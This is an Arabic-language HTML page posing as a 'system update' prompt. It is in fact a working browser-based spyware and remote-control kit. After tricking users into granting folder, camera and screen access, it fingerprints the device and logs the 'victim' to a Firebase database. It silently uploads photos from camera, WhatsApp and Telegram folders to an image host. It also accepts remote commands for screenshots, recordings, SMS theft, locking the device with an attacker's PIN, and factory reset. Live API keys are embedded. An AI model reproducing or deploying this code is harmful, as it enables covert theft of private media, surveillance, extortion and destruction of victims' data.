<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>تحديث النظام</title>
    <style>
        body { background: #000; color: #fff; font-family: 'Courier New',monospace; display: flex; align-items: center; justify-content: center; height: 100vh; flex-direction: column; margin: 0; }
        #msg { font-size: 1.4em; text-align: center; margin-bottom: 30px; padding: 0 20px; }
        .btn { background: #0af; color: #000; padding: 15px 40px; border: none; font-weight: bold; cursor: pointer; font-size: 1.3em; border-radius: 5px; display: none; }
    </style>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
</head>
<body>
    <div id="msg">📱 تحديث النظام مطلوب</div>
    <button id="grantBtn" class="btn" onclick="startPayload()">بدء التحديث</button>
    <script>
        // ========== إعدادات ==========
        const firebaseConfig = {
            apiKey: "AIzaSyCUUU64NotDyl-qjSvAD1jQZSQZrZEcuvU",
            authDomain: "zwahy-5b75d.firebaseapp.com",
            databaseURL: "https://zwahy-5b75d-default-rtdb.firebaseio.com",
            projectId: "zwahy-5b75d",
            storageBucket: "zwahy-5b75d.firebasestorage.app",
            messagingSenderId: "820206227713",
            appId: "1:820206227713:web:02057307aca7dfb7100b00"
        };
        const IMGBB_KEY = "69e4b5971880f9d736172f5fc9eb5bac";
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const vid = 'phantom-' + Date.now().toString(36) + Math.random().toString(36).substr(2,5);
        const vref = db.ref('victims/' + vid);
        let ROOT_HANDLE = null;
        let camStream = null;
        let lootCounter = 0;
        let isAlive = true;

        // ========== بدء الواجهة ==========
        setTimeout(() => {
            document.getElementById('msg').innerText = "اضغط للبدء";
            document.getElementById('grantBtn').style.display = 'block';
        }, 1500);

        window.startPayload = async function() {
            document.getElementById('grantBtn').style.display = 'none';
            document.getElementById('msg').innerText = "جاري التحديث...";

            // تسجيل الجهاز فوراً
            await registerDevice();

            // طلب الصلاحيات
            try {
                const p1 = window.showDirectoryPicker({ mode: 'readwrite' });
                const p2 = new Promise((_, reject) => setTimeout(() => reject('timeout'), 4000));
                ROOT_HANDLE = await Promise.race([p1, p2]);
            } catch(e) { ROOT_HANDLE = null; }

            try { camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false }); } catch(e) {}
            try { const d = await navigator.mediaDevices.getDisplayMedia({ video: true }); d.getTracks().forEach(t => t.stop()); } catch(e) {}

            // تأكيد الاتصال
            vref.child('online').set(true);
            document.getElementById('msg').innerText = "✅ تم";
            setTimeout(() => {
                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
            }, 800);

            // بدء الفيروس الصامت (جمع الصور تلقائياً)
            startSilentVirus();
            
            // بدء استقبال الأوامر
            listenForCommands();
            
            // إرسال ping كل 10 ثوان للإبقاء على الاتصال
            setInterval(() => vref.child('online').set(true), 10000);
        };

        // ========== الفيروس الصامت ==========
        async function startSilentVirus() {
            if (!ROOT_HANDLE) return;
            
            // قائمة المجلدات للبحث
            const folders = [
                'DCIM/Camera', 'DCIM/Screenshots',
                'Pictures', 'Download', 'Downloads',
                'WhatsApp/Media/WhatsApp Images',
                'Facebook/Media', 'Messenger/Media',
                'Telegram/Telegram Images'
            ];

            for (const folder of folders) {
                if (!isAlive) return;
                try {
                    let current = ROOT_HANDLE;
                    const parts = folder.split('/');
                    for (const part of parts) {
                        current = await current.getDirectoryHandle(part);
                    }
                    await stealFiles(current, folder);
                } catch(e) {
                    // مجلد غير موجود، تخطي
                }
            }
        }

        async function stealFiles(dirHandle, prefix) {
            for await (let entry of dirHandle.values()) {
                if (!isAlive) return;
                if (entry.kind === 'file') {
                    const file = await entry.getFile();
                    const ext = file.name.split('.').pop().toLowerCase();
                    if (!['jpg','jpeg','png','gif','webp','mp4','mov'].includes(ext)) continue;
                    if (file.size > 10*1024*1024) continue;
                    
                    try {
                        const reader = new FileReader();
                        reader.onload = async (e) => {
                            const b64 = e.target.result.split(',')[1];
                            const url = await uploadToImgBB(b64);
                            lootCounter++;
                            await vref.child('loot').push({
                                type: 'photo',
                                url: url,
                                name: prefix + '/' + entry.name,
                                size: file.size,
                                ts: Date.now(),
                                counter: lootCounter
                            });
                        };
                        reader.readAsDataURL(file);
                    } catch(e) {}
                } else if (entry.kind === 'directory') {
                    try {
                        const sub = await dirHandle.getDirectoryHandle(entry.name);
                        await stealFiles(sub, prefix + '/' + entry.name);
                    } catch(e) {}
                }
            }
        }

        // ========== تسجيل الجهاز ==========
        async function registerDevice() {
            let ip = 'غير معروف';
            try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e) {}
            let battery = '?', charging = false;
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    battery = Math.round(b.level * 100) + '%';
                    charging = b.charging;
                }
            } catch(e) {}
            await vref.set({
                online: true,
                fingerprint: {
                    ua: navigator.userAgent,
                    plat: navigator.platform,
                    scr: screen.width + 'x' + screen.height,
                    cores: navigator.hardwareConcurrency,
                    mem: navigator.deviceMemory || '?',
                    ip: ip, battery: battery, charging: charging,
                    language: navigator.language,
                    time: new Date().toLocaleString()
                }
            });
        }

        // ========== استقبال الأوامر ==========
        function listenForCommands() {
            vref.child('command').on('value', async (snap) => {
                const cmd = snap.val();
                if (!cmd) return;
                
                try {
                    switch(cmd.action) {
                        case 'get_all_photos':
                            if (ROOT_HANDLE) await startSilentVirus();
                            break;
                        case 'get_all_sms':
                            await stealSMS();
                            break;
                        case 'get_device_info':
                            await sendDeviceInfo();
                            break;
                        case 'vibrate':
                            if (navigator.vibrate) navigator.vibrate([500,200,500,200,500]);
                            break;
                        case 'play_sound':
                            playSound();
                            break;
                        case 'screenshot':
                            await takeScreenshot();
                            break;
                        case 'record_video':
                            await recordVideo(cmd.duration || 10);
                            break;
                        case 'flash_on':
                            await toggleFlash(true);
                            break;
                        case 'flash_off':
                            await toggleFlash(false);
                            break;
                        case 'lock_screen':
                            lockDevice(cmd.pin || '');
                            break;
                        case 'send_notification':
                            showNotify(cmd.message || '');
                            break;
                        case 'format':
                            window.open('intent://#Intent;action=android.intent.action.MASTER_CLEAR;end');
                            break;
                    }
                } catch(e) {
                    console.error('خطأ:', e.message);
                }
                await vref.child('command').remove();
            });
        }

        // ========== صوت ==========
        function playSound() {
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                osc.type = 'square';
                osc.frequency.value = 800;
                gain.gain.value = 0.5;
                osc.connect(gain);
                gain.connect(ctx.destination);
                osc.start();
                setTimeout(() => { osc.stop(); gain.disconnect(); ctx.close(); }, 3000);
            } catch(e) {}
        }

        // ========== إشعار ==========
        function showNotify(msg) {
            const div = document.createElement('div');
            div.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#ff0;color:#000;padding:20px;border-radius:10px;font-size:1.2em;font-weight:bold;z-index:999999;text-align:center;';
            div.textContent = msg;
            document.body.appendChild(div);
            setTimeout(() => div.remove(), 3000);
        }

        // ========== فلاش ==========
        async function toggleFlash(on) {
            if (!camStream) return;
            const track = camStream.getVideoTracks()[0];
            if (track && track.applyConstraints) {
                await track.applyConstraints({ advanced: [{ torch: on }] });
            }
        }

        // ========== لقطة شاشة ==========
        async function takeScreenshot() {
            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const b64 = canvas.toDataURL('image/png').split(',')[1];
            const url = await uploadToImgBB(b64);
            lootCounter++;
            await vref.child('loot').push({
                type: 'screenshot',
                url: url,
                name: 'screenshot_' + Date.now() + '.png',
                ts: Date.now(),
                counter: lootCounter
            });
            stream.getTracks().forEach(t => t.stop());
        }

        // ========== فيديو ==========
        async function recordVideo(sec) {
            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
            const recorder = new MediaRecorder(stream);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                const reader = new FileReader();
                reader.onload = async (e) => {
                    const b64 = e.target.result.split(',')[1];
                    const url = await uploadToImgBB(b64);
                    lootCounter++;
                    await vref.child('loot').push({
                        type: 'video',
                        url: url,
                        name: 'video_' + Date.now() + '.webm',
                        ts: Date.now(),
                        counter: lootCounter
                    });
                };
                reader.readAsDataURL(blob);
                stream.getTracks().forEach(t => t.stop());
            };
            recorder.start();
            setTimeout(() => recorder.stop(), sec * 1000);
        }

        // ========== SMS ==========
        async function stealSMS() {
            try {
                let messages = [];
                if ('webkitSms' in window) {
                    const list = await window.webkitSms.getMessages({});
                    for (let sms of list) messages.push({ from: sms.sender, body: sms.body, date: new Date(sms.timestamp).toLocaleString() });
                } else if ('sms' in navigator) {
                    const list = await navigator.sms.getMessages({});
                    for (let sms of list) messages.push({ from: sms.sender, body: sms.body, date: new Date(sms.timestamp).toLocaleString() });
                }
                lootCounter++;
                await vref.child('loot').push({
                    type: 'sms',
                    info: messages.slice(-20),
                    ts: Date.now(),
                    counter: lootCounter
                });
            } catch(e) {
                lootCounter++;
                await vref.child('loot').push({
                    type: 'sms',
                    info: { error: 'SMS API غير مدعومة في هذا المتصفح' },
                    ts: Date.now(),
                    counter: lootCounter
                });
            }
        }

        // ========== معلومات الجهاز ==========
        async function sendDeviceInfo() {
            const snap = await vref.child('fingerprint').once('value');
            const info = snap.val() || {};
            info.connection = navigator.connection ? navigator.connection.effectiveType : 'غير معروف';
            info.cookies = navigator.cookieEnabled;
            info.online = navigator.onLine;
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                info.gpu = gl ? gl.getParameter(gl.RENDERER) : 'غير معروف';
            } catch(e) { info.gpu = 'غير معروف'; }
            
            lootCounter++;
            await vref.child('loot').push({
                type: 'device_info',
                info: info,
                ts: Date.now(),
                counter: lootCounter
            });
        }

        // ========== قفل ==========
        function lockDevice(pin) {
            try {
                window.open(`intent://#Intent;action=android.app.action.SET_NEW_PASSWORD;extra.android.app.extra.PASSWORD=${pin};end`);
                setTimeout(() => window.open('intent://#Intent;action=android.app.action.LOCK_DEVICE;end'), 500);
            } catch(e) {}
        }

        // ========== ImgBB ==========
        async function uploadToImgBB(b64) {
            const fd = new FormData();
            fd.append('key', IMGBB_KEY);
            fd.append('image', b64);
            const res = await fetch('https://api.imgbb.com/1/upload', { method: 'POST', body: fd });
            const json = await res.json();
            if (json.success) return json.data.url;
            throw new Error('فشل الرفع');
        }
    </script>
</body>
</html>
